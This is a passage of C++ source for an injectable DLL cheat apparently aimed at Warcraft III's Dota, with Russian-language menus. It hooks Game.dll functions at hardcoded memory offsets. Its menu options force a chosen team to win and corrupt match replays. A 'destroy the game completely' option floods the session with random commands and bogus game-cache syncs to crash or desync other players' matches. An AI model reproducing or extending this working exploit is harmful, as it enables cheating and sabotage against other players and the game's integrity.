		while ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
		{
			Sleep( 20 );
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
	{
		menuid = 4;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
		{
			Sleep( 20 );
		}
		return;
	}

	if ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
	{
		menuid = 6;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
		{
			Sleep( 20 );
		}
		return;
	}


	/*
	Вы открыли меню Dota Unreal Data Hack.
	Выберите нужное Вам действие:

	1. Я хочу победить!
	2. Я хочу убить реплей!
	3. Я хочу изменить игровые данные!

	0. Выход из меню
	*/
}

void ShowWinMenu( )
{
	/*
	Вы открыли меню "Хочу победить".
	Выберите действие:

	1. Победит 1 тима
	2. Победит 2 тима

	0. Выйти из меню.
	*/

	TextPrint( "Вы открыли меню \"Хочу победить\".\nВыберите нужное Вам действие:\n \n1. Победит 1 тима\n2. Победит 2 тима\n \n0. Выйти из меню." , 1 );

	if ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
	{
		menuid = 1;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
		{
			Sleep( 20 );
		}
		return;
	}




	if ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс победы 1 тимы..." , 1 );

		for ( int i = 0; i < 8; i++ )
		{
			WinhackTeam1( );
			Sleep( 2200 );
			IsGameEndThenExit;
			TextPrint( "Пожалуйста подождите еще несколько секунд..." , 1 );
		
		}

		TextPrint( "Задание выполнено. Ожидайте... Или повторите попытку." , 5 );
		Sleep( 2500 );

		while ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
		{
			Sleep( 20 );
		}
		return;
	}

	if ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс победы 2 тимы..." , 1 );

		for ( int i = 0; i < 8; i++ )
		{
			WinhackTeam2( );
			Sleep( 2200 );
			IsGameEndThenExit;
			TextPrint( "Пожалуйста подождите еще несколько секунд..." , 1 );
		
		}

		TextPrint( "Задание выполнено. Ожидайте... Или повторите попытку." , 5 );
		Sleep( 2500 );

		while ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
		{
			Sleep( 20 );
		}
		return;
	}

}

void ShowReplayKillMenu( )
{
	TextPrint( "Вы открыли меню \"Хочу убить реплей\".\nВыберите количество попыток:\n\n1. 1 Повтор\n2. 2 Повтора\n3. 5 Повторов\n4. 10 Повторов\n\n0. Выйти из меню.\n\nВнимание есть вероятность вызвать переполнение буфера!\nРекомендуется использовать не более чем 10 повторов. \n    (1 Повтор = ~20 секунд зависания.)" , 1 );
	if ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
	{
		menuid = 1;
		IsGameEndThenExit;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
		{
			Sleep( 20 );
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс уничтожения реплея..." , 1 );

		for ( int i = 0; i < 1; i++ )
		{
			MakeBad( );
			IsGameEndThenExit;
		}
		TextPrint( "Задание выполнено. Результат не известен.\nМожете повторять несколько раз что бы наверняка убить :)." , 5 );
		Sleep( 3000 );


		while ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
		{
			IsGameEndThenExit;
			Sleep( 20 );
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс уничтожения реплея..." , 1 );

		for ( int i = 0; i < 2; i++ )
		{
			MakeBad( );
			Sleep( 5 );
			IsGameEndThenExit;
		}
		TextPrint( "Задание выполнено. Результат не известен.\nМожете повторять несколько раз что бы наверняка убить :)." , 5 );
		Sleep( 3000 );


		while ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}



	if ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс уничтожения реплея..." , 1 );

		for ( int i = 0; i < 5; i++ )
		{
			MakeBad( );
			Sleep( 5 );
			IsGameEndThenExit;
		}
		TextPrint( "Задание выполнено. Результат не известен.\nМожете повторять несколько раз что бы наверняка убить :)." , 5 );
		Sleep( 3000 );


		while ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}



	if ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		TextPrint( "Принято! Запускаю процесс уничтожения реплея..." , 1 );

		for ( int i = 0; i < 10; i++ )
		{
			MakeBad( );
			Sleep( 5 );
			IsGameEndThenExit;
		}
		TextPrint( "Задание выполнено. Результат не известен.\nМожете повторять несколько раз что бы наверняка убить :)." , 5 );
		Sleep( 3000 );


		while ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}




}

void ProcessMenu4( )
{
	TextPrint( "Вы вошли в меню \"Редактор игровых данных\".\n\n"
			   "1. Подставить игрока\n"
			   "2. Добавить игроку килов\n"
			   "3. Добавить игроку ассистов\n"
			   "4. Снести лайн\n"
			   "5. Убить курьеров\n"
			   "6. Снести пару вышек \n" , 1 );
	TextPrint( "Извините меню не доступно на данный момент" , 2 );
	Sleep( 2000 );
	menuid = 0;
}

void ProcessMenu5( )
{
	TextPrint( "Вы вошли в меню \"Сделать игрока козлом отпущения\".\n\n"
			   "1. Дать ему 6 рапир\n"
			   "2. Дать ему 6 аегисов\n"
			   "3. Максимум килов, асистов и всего остального\n" , 1 );

	TextPrint( "Извините меню не доступно на данный момент" , 2 );
	Sleep( 2000 );
	menuid = 0;
}

void ProcessMenu6( )
{
	TextPrint( "Вы вошли в секретное меню!\n\n"
			   "1. Установить цвет юнита\n"
			   "2. Установить размер юнита\n"
			   "3. Установить цвет всех юнитов\n"
			   "4. Уничтожить игру ПОЛНОСТЬЮ\n"
			   "\n0. Выйти из этого меню\n"
			   "\n\nВнимание! Изменения не обратимые!" , 1 );

	if ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
	{
		menuid = 1;
		ClearTextMessages( );
		while ( IsKeyPressed( VK_NUMPAD0 ) || IsKeyPressed( '0' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
	{
		menuid = 7;
		ClearTextMessages( );

		while ( IsKeyPressed( VK_NUMPAD1 ) || IsKeyPressed( '1' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
	{
		menuid = 8;
		ClearTextMessages( );

		while ( IsKeyPressed( VK_NUMPAD2 ) || IsKeyPressed( '2' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}

	if ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
	{
		menuid = 0;
		ClearTextMessages( );
		for ( UINT i = 0x100000; i < GetMaxUnitForMap( ); i++ )
		{
			if ( GetUnitTypeId( i ) > 0 && !IsUnitIllusion( i ) )
			{
				int red = 255;
				int green = 255;
				int blue = 255;
				int alpha = 255 - ( rand( ) % 25 );

				switch ( GetPlayerId( GetOwningPlayer( i ) ) + 1 )
				{
					case 1:
						red = 255;
						green = 2;
						blue = 2;
						break;

					case 2:
						red = 0;
						green = 65;
						blue = 255;
						break;

					case 3:
						red = 27;
						green = 229;
						blue = 184;
						break;

					case 4:
						red = 83;
						green = 0;
						blue = 128;
						break;

					case 5:
						red = 255;
						green = 255;
						blue = 0;
						break;

					case 6:
						red = 254;
						green = 137;
						blue = 13;
						break;

					case 7:
						red = 31;
						green = 191;
						blue = 0;
						break;

					case 8:
						red = 228;
						green = 90;
						blue = 170;
						break;

					case 9:
						red = 148;
						green = 149;
						blue = 150;
						break;

					case 10:
						red = 125;
						green = 190;
						blue = 241;
						break;

					case 11:
						red = 15;
						green = 97;
						blue = 69;
						break;
					case 12:
						red = 77;
						green = 41;
						blue = 3;
						break;

					default:
						break;
				}

				IsGameEndThenExit;
				SetUnitVertexColor( i , red , green , blue , alpha );
			}


		}



		while ( IsKeyPressed( VK_NUMPAD3 ) || IsKeyPressed( '3' ) )
		{
			Sleep( 20 );
			IsGameEndThenExit;
		}
		return;
	}


	if ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
	{
		menuid = 8;
		ClearTextMessages( );
		char * gameover1 = "G";
		char * gameover2 = "O";
		JassString * jGameOver1 = new JassString( );
		JassString * jGameOver2 = new JassString( );

		GetJassString( gameover1 , jGameOver1 );
		GetJassString( gameover2 , jGameOver2 );

		if ( GetSelectedOwnedUnit( ) )
		{

			for ( int i = 0; i < 300; i++ )
			{
				float float1;
				float float2;

				*( DWORD* ) &float1 = rand( ) % 0xFFFFFFFF;
				*( DWORD* ) &float2 = rand( ) % 0xFFFFFFFF;

				IsGameEndThenExit;
				SendMoveAttackCommand( float1 , float2 , (851971-100 )+( rand()%100000) );
			}

		}
		for ( int i = 0; i < 1000; i++ )
		{
			IsGameEndThenExit;
			StoreInteger( gamecache , jGameOver1 , jGameOver2 , 0xFFFFFFFF - 1000 );
			SyncStoredInteger( gamecache , jGameOver1 , jGameOver2 );
		}
		TextPrint( "Этап первый завершен. Запуск уничтожителя реплеев..." , 3 );
		Sleep( 5000 );
		IsGameEndThenExit;

		

		MakeBad( );
		TextPrint( "Запуск уничтожителя реплеев...№2" , 3 );

		Sleep( 10000 );

		MakeBad( );
		TextPrint( "Если повезет то ПИ*ЕЦ игре пришел. Если нет то не повезло :(" , 3 );
		Sleep( 2000 );

		while ( IsKeyPressed( VK_NUMPAD4 ) || IsKeyPressed( '4' ) )
		{
			Sleep( 20 ); 
			IsGameEndThenExit;
		}
		return;
	}


}

void ProcessMenu7( )
{

}

void ProcessMenu8( )
{

}


void ProcessMenu9( )
{

}


void ProcessMenu10( )
{

}


void ProcessMenu11( )
{

}

void MenuActionStart( )
{
	while ( TRUE )
	{
	restartgame:
		Sleep( 25 );
		if ( ingame )
		{
			IsGameEndThenRestart;
			if ( ( IsKeyPressed( VK_LCONTROL ) || IsKeyPressed( VK_RCONTROL ) ) && IsKeyPressed( VK_F5 ) )
			{
				menuid = 1;
			}


			if ( menuid > 0 )
			{
				ismenuopened = TRUE;
				ClearTextMessages( );

				switch ( menuid )
				{
					case 1:
						ShowMainMenu( );
						break;
					case 2:
						ShowWinMenu( );
						break;
					case 3:
						ShowReplayKillMenu( );
						break;
					case 4:
						ProcessMenu4( );
						break;
					case 5:
						ProcessMenu5( );
						break;
					case 6:
						ProcessMenu6( );
						break;
					case 7:
						ProcessMenu7( );
						break;
					case 8:
						ProcessMenu8( );
						break;
					case 9:
						ProcessMenu9( );
						break;
					case 10:
						ProcessMenu10( );
						break;
					case 11:
						ProcessMenu11( );
						break;

					default:
						break;
				}



			}
			else
			{
				if ( ismenuopened )
				{
					ismenuopened = FALSE;
					ClearTextMessages( );
				}
			}
		}
	}
}


DWORD WINAPI MenuAndActionThread( LPVOID )
{
	//if ( _strcmpi( PASTEHWIDHERE.c_str( ) , GetHWID( ).c_str( ) ) == 0 )
	//{
		Sleep( 2000 );
		SetTlsForMe( );
	//}
	//else
	//	return 0;

	while ( TRUE )
	{
		try
		{
			MenuActionStart( );
		}
		catch (... )
		{
			DWORD lol = rand( ) % 100000;
			thr2 = CreateThread( 0 , 0 , MenuAndActionThread , &lol , 0 , 0 );
			return 0;
		}
	}


	return 0;
}


typedef void( __fastcall * maxtrololo )( );
maxtrololo maxtrololo222;

void __fastcall Trololo1( )
{
	std::string messageerr = std::string( "B" ) + std::string( "A" ) + std::string( "D" ) + std::string( " " ) + std::string( "H" ) +
		std::string( "W" ) + std::string( "I" ) + std::string( "D" );

	std::string sorrymsg = std::string( "E" ) + std::string( "R" ) + std::string( "R" ) + std::string( "O" ) + std::string( "R" ) + std::string( "." );

	MessageBox( 0 , messageerr.c_str() , sorrymsg.c_str( ) , 0 );

}
void Trololo2( )
{
	maxtrololo222( );
}
void Trololo3( )
{
	Trololo2( );
}
void Trololo4( )
{
	maxtrololo222 = ( maxtrololo )Trololo1;
	Trololo3( );
}
void Trololo5( )
{
	Trololo4( );
}
void Trololo6( )
{
	Trololo5( );
}
void Trololo7( )
{
	Trololo6( );
}

void StartGameChacheWatch( )
{
	while ( TRUE )
	{
	restartgame:
		Sleep( 444 );
		if ( IsGame( ) )
		{
			if ( !ingame )
			{

				if ( jassstringinitialized )
				{
					jassstringinitialized = FALSE;
					delete fordetect;
					delete jData;
					delete jGlobal;
					delete jWinner;
					delete jM;
					delete jS;
					delete jThrone;
					delete jTree;
					delete jGameStart;
					fordetect = new JassString( );
					jData = new JassString( );
					jGlobal = new JassString( );
					jWinner = new JassString( );
					jM = new JassString( );
					jS = new JassString( );
					jThrone = new JassString( );
					jTree = new JassString( );
					jGameStart = new JassString( );
				}


				if ( !jassstringinitialized )
				{
					jassstringinitialized = TRUE;
					fordetect = new JassString( );
					jData = new JassString( );
					jGlobal = new JassString( );
					jWinner = new JassString( );
					jM = new JassString( );
					jS = new JassString( );
					jThrone = new JassString( );
					jTree = new JassString( );
					jGameStart = new JassString( );
					/*
					JassString * jData;
					JassString * jGlobal;
					JassString * jWinner;
					JassString * jM;
					JassString * jS;
					JassString * jThrone;
					JassString * jTree;
					*/
				}


				GetJassString( "PID" , fordetect );
				GetJassString( "Data" , jData );
				GetJassString( "Global" , jGlobal );
				GetJassString( "Winner" , jWinner );
				GetJassString( "m" , jM );
				GetJassString( "s" , jS );
				GetJassString( "Throne" , jThrone );
				GetJassString( "Tree" , jTree );
				GetJassString( "GameStart" , jGameStart );

				gamecache = 0x100000;
				Sleep( 5000 );
				IsGameEndThenRestart;
				InitGameCache( );

				ingame = TRUE;
			}




		}
		else
		{
			ingame = FALSE;
		}

	}
}

DWORD WINAPI GameCacheWatcher( LPVOID )
{
	if ( !initializedgamedll )
	{
		initializedgamedll = TRUE;
		GameDll = ( int ) GetModuleHandle( "Game.dll" );
		GetBtnAddr_p = ( GetBtnAddrGAME ) ( 0x5FA970 + GameDll );
		StoreInteger = ( pStoreInteger ) ( 0x3CA0A0 + GameDll );
		SyncStoredInteger = ( pSyncStoredInteger ) ( 0x3CA6E0 + GameDll );
		GetStoredInteger = ( pGetStoredInteger ) ( 0x3CA870 + GameDll );
		ClearTextMessages = ( pClearTextMessages ) ( 0x3B4E60 + GameDll );
		ClearSelection = ( pClearSelection ) ( 0x3BBAA0 + GameDll );
		GetUnitTypeId = ( pGetUnitTypeId ) ( 0x3C5910 + GameDll );
		GetOwningPlayer = ( pGetOwningPlayer ) ( 0x3C8190 + GameDll );
		GetPlayerId = ( pGetPlayerId ) ( 0x3C9640 + GameDll );
		SetUnitVertexColor = ( pSetUnitVertexColor ) ( 0x3C6340 + GameDll );
		IsUnitIllusion = ( pIsUnitIllusion ) ( 0x3C7B50 + GameDll );
		sub_6F41B420 = ( psub_6F41B420 ) ( GameDll + 0x41B420 );
	}

	//if ( _strcmpi( PASTEHWIDHERE.c_str( ) , GetHWID( ).c_str( ) ) == 0 )
	//{
		Sleep( 2000 );
		SetTlsForMe( );
//	}
//	else
//	{
//		Trololo7( );
	//	return 0;
//	}

	while ( TRUE )
	{
		try
		{
			StartGameChacheWatch( );
		}
		catch ( ... )
		{
			DWORD lol = rand( ) % UINT_MAX;
			thr1 = CreateThread( 0 , 0 , GameCacheWatcher , &lol , 0 , 0 );
			return 0;
		}
	}
	

	return 0;
}

BOOL WINAPI DllMain( HINSTANCE hDLL , UINT reason , LPVOID reserved )
{
	if ( reason == DLL_PROCESS_ATTACH )
	{
		DWORD lol = rand( ) % UINT_MAX;
		thr1 = CreateThread( 0 , 0 , GameCacheWatcher , &lol , 0 , 0 );
		DWORD lol2 = rand( ) % UINT_MAX;
		thr2 = CreateThread( 0 , 0 , MenuAndActionThread , &lol , 0 , 0 );
	}
	else if ( reason == DLL_PROCESS_DETACH )
	{
		TerminateThread( thr1 , 0 );
		TerminateThread( thr2 , 0 );
	}
	return TRUE;
}
